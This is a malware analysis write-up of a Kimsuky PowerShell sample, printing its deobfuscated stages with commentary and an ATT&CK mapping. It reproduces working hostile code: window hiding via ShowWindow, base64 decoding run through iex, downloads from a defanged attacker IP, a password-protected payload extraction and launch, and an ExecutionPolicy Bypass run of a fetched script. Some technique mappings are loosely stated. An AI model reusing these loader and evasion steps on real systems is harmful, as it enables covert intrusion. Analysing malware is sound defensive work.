==================================================================================
TITLE: Exploring the interesting techniques of Kimsuky Malware (NORTH KOREAN APT)
CREATED BY: @untw0  
DATE: 05/08/2025
==================================================================================  

----------
SUMMARY:
----------

1. Introduction
2. Technical Analysis
   2.1. C# Injection with Add-Type
   2.2. Process Hiding via ShowWindow
   2.3. Base64 Obfuscation and Dynamic Execution
   2.4. Distraction PDF and Social Engineering
   2.5. External Tools and Payload Extraction
   2.6. Multi-stage Payload Execution
   2.7. Final Stage Script Execution
3. MITRE ATT&CK Mapping
4. Final Thoughts

============================================================
1. INTRODUCTION
============================================================

APT refers to Advanced Persistent Threat groups known for highly advanced and stealthy malware.  
The sample analyzed here is tagged as APT, Kimsuky, and written in PowerShell (.ps1), found on Malware Bazaar.  
Objective: learn advanced evasion and staging techniques.

============================================================
2. TECHNICAL ANALYSIS
============================================================

----------------------------------
2.1. C# Injection with Add-Type
----------------------------------

$sd = Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class WinHpXN
{
    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    public static void SwMng(int processId, int sw)
    {
        Process process = Process.GetProcessById(processId);
        IntPtr hWnd = process.MainWindowHandle;
        if (hWnd != IntPtr.Zero)
            ShowWindow(hWnd, sw);
    }
}
"@

- The script uses Add-Type to inject and compile C# code inline.
- Class WinHpXN is created to P/Invoke ShowWindow from user32.dll.
- Purpose: Hide or show windows from specific processes.

sw values:
  0 = SW_HIDE → hide window  
  5 = SW_SHOW → show window (not used here, was an example!)

-------------------------------------
2.2. Process Hiding via ShowWindow
-------------------------------------

$fd = Get-Process -Name powershell,WindowsTerminal
foreach ($fz in $fd) {
    [WinHpXN]::SwMng($fz.Id, 0)
}

- Uses Get-Process to find powershell, WindowsTerminal.
- For each, calls [WinHpXN]::SwMng(ID, 0) to hide their GUI.
- Purpose: Visual evasion (no visible terminal),  
           Sandbox/analyst evasion and Stealth

------------------------------------------------
2.3. Base64 Obfuscation and Dynamic Execution
------------------------------------------------

$gvb = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sd.Replace('@', '')))
iex $gvb

- Removes '@' to bypass AV pattern matching.
- Decodes and executes obfuscated code via Invoke-Expression (iex).
- Typical eval-style execution.

1. Note: The malware came with @ in the middle of the obfuscation.
2. Note: All this code you are seeing has been deobfuscated, but
I didn't forget to talk about the malware obfuscation technique!

----------------------------------------------
2.4. Distraction PDF and Social Engineering
----------------------------------------------

Invoke-WebRequest -Uri "http://92[.]119[.]114[.]128/doc.pdf" -OutFile "$env:TEMP\Distribution Document.pdf"
Start-Process -FilePath "Distribution Document.pdf"

- Downloads and opens a PDF.
- Technique: decoy document to distract the user during malicious activity.

Note: "http://92[.]119[.]114[.]128" this IP has a criminal tag!

--------------------------------------------
2.5. External Tools and Payload Extraction
--------------------------------------------

Invoke-WebRequest -Uri "http://92[.]119[.]114[.]128/Assets/UnRAR.exe"


- Downloads UnRAR executable to extract password-protected payloads.
- Used to bypass EDR detection (avoid Expand-Archive).

Note: "http://92[.]119[.]114[.]128" this IP has a criminal tag!

--------------------------------------
2.6. Multi-stage Payload Execution
--------------------------------------

cmd.exe /C "$env:TEMP\UnRAR.exe x -ppoiuytrewq1234 -o+ $env:TEMP\orwartde.rar $env:TEMP"
Start-Process -FilePath orwartde.exe


- Extracts .rar using a password.
- Executes orwartde.exe and later enwtsv.exe, likely with different purposes.
- Repetition increases persistence and fault tolerance.

Note: Password used: poiuytrewq1234 -> protects content from AV scanning.

--------------------------------------
2.7. Final Stage Script Execution
--------------------------------------

$t = Invoke-WebRequest ...
$gds = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($t))
Set-Content -Path "$env:TEMP\ov4_dd_pf.txt" -Value $gds 
if (Test-Path "$env:TEMP\ov4_dd_pf.ps1") {
    Remove-Item -Path "$env:TEMP\ov4_dd_pf.ps1" -Force
}
cmd.exe /C "powershell -ExecutionPolicy Bypass -File $env:TEMP\ov4_dd_pf.ps1"

- Another layer of base64-encoded PowerShell is decoded and executed.
- ExecutionPolicy Bypass is used to override local script restrictions.
- File is renamed from .txt to .ps1 to hide intentions.
- Run the .ps1 recent-rename script, using PowerShell.
- The -ExecutionPolicy Bypass parameter bypasses execution policies that 
  would normally prevent malicious scripts from running.

============================================================
3. MITRE ATT&CK MAPPING
============================================================

--------------------------------------------------------------------
[Defense Evasion]
- T1027: Obfuscated Files (Base64)
- T1027.002: Packed Files (.rar with password)
- T1218: Signed Binary Proxy Execution (cmd.exe, Start-Process)
- T1036: Masquerading (.ps1 disguised as .txt)
- T1548.002: Bypass User Account Control (ExecutionPolicy Bypass)
--------------------------------------------------------------------

--------------------------------------------------------------
[Command and Control]
- T1071.001: Application Layer Protocol (HTTP)
- T1105: Ingress Tool Transfer (Downloads: .exe, .rar)
--------------------------------------------------------------

--------------------------------------------------------------
[Discovery]
- T1057: Process Discovery (Get-Process to find terminals)
--------------------------------------------------------------

============================================================
4. FINAL THOUGHTS
============================================================

In my opinion, we were able to learn a lot, especially interesting 
APT techniques that can be used in the real world.

Thx for reading!
- @untw0 :)
